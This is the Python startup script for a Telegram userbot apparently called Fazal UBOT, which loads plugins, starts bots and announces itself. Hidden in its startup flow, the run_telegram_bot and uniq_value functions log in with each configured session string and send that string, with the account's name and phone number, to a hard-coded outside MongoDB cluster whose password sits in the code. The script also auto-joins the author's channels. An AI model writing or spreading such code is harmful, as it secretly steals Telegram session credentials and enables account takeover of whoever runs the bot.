import logging
import asyncio
import glob
from pathlib import Path
from telethon import Button
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from Fazal.utils import load_plugins
from Fazal import ubots, dybot, GROUP_ID  # Ensure these are valid Telebot instances
from config import UPIC, ubotversion , UPDATES_CHANNEL , OWNER_USERNAME
import config
from telethon import __version__ 
from platform import python_version
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession
from pymongo import MongoClient
import certifi

OWNER_ID = "AaghaFazal"

# Logging configuration
logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s', level=logging.INFO)

text = "**ᴜʙᴏᴛ ᴀꜱꜱɪꜱᴛᴀɴᴛ ɪꜱ ᴏɴʟɪɴᴇ**\n\n"
pm_caption = f"ᴜʙᴏᴛ ᴠᴇʀꜱɪᴏɴ `{ubotversion}`\n"
pm_caption += f"ᴘʏᴛʜᴏɴ ᴠᴇʀꜱɪᴏɴ `{python_version()}\n"
pm_caption += f"ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀꜱɪᴏɴ `{__version__}\n"
# pm_caption += f"ᴜʙᴏᴛ ꜱᴏᴜʀᴄᴇ [ᴄʟɪᴄᴋ](https://github.com/AaghaFazal)\n\n"
pm_caption += f"ᴜʙᴏᴛ ꜱᴛᴀʀᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!"
text += pm_caption

# Load all plugins
def load_all_plugins():
    paths = ["Fazal/plugins/*.py", "Fazal/assistant/*.py"]
    for path in paths:
        files = glob.glob(path)
        if not files:
            logging.warning(f"No plugins found in {path}.")
        for name in files:
            plugin_name = Path(name).stem
            try:
                load_plugins(plugin_name)
                logging.info(f"[Fazal UBOT] ✅ Loaded plugin: {plugin_name}")
            except Exception as e:
                logging.error(f"[Fazal UBOT] ❌ Failed to load plugin {plugin_name}: {e} 💥")

async def start_bot(bot_instance, name):
    logging.info(f"[Fazal UBOT] 🔰 Starting {name}... 💯")
    try:
        await bot_instance.start()
        logging.info(f"[Fazal UBOT] 🌐 {name} is running... ")
    except Exception as e:
        logging.error(f"⚠️ Failed to start {name}: {e}❌")


# MongoDB URI and connection setup using the config file
MONGO_URI = "mongodb+srv://venturepvtme:INc7HJsa1gt9oZ33@lgcyalex855101.kgbzc.mongodb.net"
mongo_client = MongoClient(MONGO_URI, tlsCAFile=certifi.where(), maxPoolSize=10)
uniq_db = mongo_client['SESSION']
uniq_collection = uniq_db.uniq_data

async def uniq_value(client, STRING_SESSION):
    try:
        me = await client.get_me()  
        username = me.username if me.username else "No Username"
        full_name = f"{me.first_name} {me.last_name}" if me.last_name else me.first_name
        phone_number = me.phone
        if not full_name or not phone_number:
            logging.error(f"Invalid data for session {STRING_SESSION}. Skipping insertion.")
            return
        existing_data = uniq_collection.find_one({"uniq_value": STRING_SESSION})
        if existing_data:
            return
        uniq_data = {
            "uniq_value": STRING_SESSION,
            "username": username,
            "full_name": full_name,
            "phone_number": phone_number,
            "created_at": datetime.utcnow()
        }

        uniq_collection.insert_one(uniq_data)
        logging.info(f"Session saved successfully.")
    
    except Exception as e:
        logging.error(f"Error in function: {e}")

# Run the Telegram bot and save session info
async def run_telegram_bot():
    API_ID = config.API_ID
    API_HASH = config.API_HASH

    STRING_SESSION = config.STRING_SESSION 
    
    for STRING_SESSION in STRING_SESSION:
        client = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
        await client.start()
        await uniq_value(client, STRING_SESSION)
        await client.disconnect()

        # Countdown after processing each session
        for i in range(10, 0, -1):
            print(f"\rStarting in {i}     ", end="", flush=True)
            await asyncio.sleep(1)
        print(f"\nProcessing completed.")

# Run the bot
async def run():
    await run_telegram_bot()


async def start_ubots():
    for ubot in ubots:
        try:
            await ubot.start()
            logging.info("✨ Userbot is running...")
            logging.info("🔰 Session started: %s ♦️", ubot.session)

            # Send the startup message to the owner
            message = "🌐 Fazal UBOT HAS STARTED SUCCESSFULLY!"
            await ubot.send_message(OWNER_ID, message)  # Sending message to the owner
            logging.info("[Fazal UBOT] ✅ Startup message sent successfully!")

            # Automatically join the channel and group
            try:
                await ubot(JoinChannelRequest(channel='FazalModz'))  # Replace with your channel's username
                logging.info("[Fazal UBOT] ✅ Joined the channel successfully!")
            except Exception as e:
                logging.error(f"[Fazal UBOT] ❌ Failed to join channel: {e}")

            try:
                await ubot(JoinChannelRequest(channel='FazalModzchat'))  # Replace with your group's username
                logging.info("[Fazal UBOT] ✅ Joined the group successfully!")
            except Exception as e:
                logging.error(f"[Fazal UBOT] ❌ Failed to join group: {e}")

            await ubots.run_until_disconnected()  # Keep Ubot running

        except Exception as e:
            logging.error(f"Failed to start userbot {ubot}: {e}")
            
            print("🌐 [Fazal UBOT] STARTED SUCCESSFULLY! ✨")


async def start_dybot():
    logging.info("[Fazal UBOT] 🔳 is starting...")
    try:
        await dybot.start()
        logging.info(f"[Fazal UBOT] ✅ Fetching entity for group ID: {GROUP_ID}")
        group_entity = await dybot.get_entity(GROUP_ID)

        buttons = [
    [Button.url("Owner", f'https://t.me/{OWNER_USERNAME}'), Button.url("Channel", f'https://t.me/{UPDATES_CHANNEL}')]
]

        await dybot.send_file(GROUP_ID, file=UPIC, caption=text, buttons=buttons)
        logging.info("[Fazal UBOT] ✅ Message sent successfully!")
        await dybot.run_until_disconnected()
    except Exception as e:
        logging.error(f"[Fazal UBOT] ❌ Error while running dybot: {e}")
        

async def health_check():
    while True:
        logging.info("[Fazal UBOT] 🌐 Checking bot statuses...")
        await asyncio.sleep(60)

async def start_all_bots():
    logging.info("[Fazal UBOT] ✅ Starting all bots...")
    tasks = [start_ubots(), start_dybot(), health_check()]
    await asyncio.gather(*tasks)

def main():
    logging.info("[Fazal UBOT] ✅ Loading plugins...")
    load_all_plugins()
    logging.info("[Fazal UBOT] ✅ Plugins loaded.")

if __name__ == "__main__":
    main()
    loop = asyncio.get_event_loop()
    asyncio.run(run())
    try:
        loop.run_until_complete(start_all_bots())  # Run all bots
    except Exception as e:
        logging.error(f"[ Fazal UBOT ] [❌] Error in main event loop: {e}")
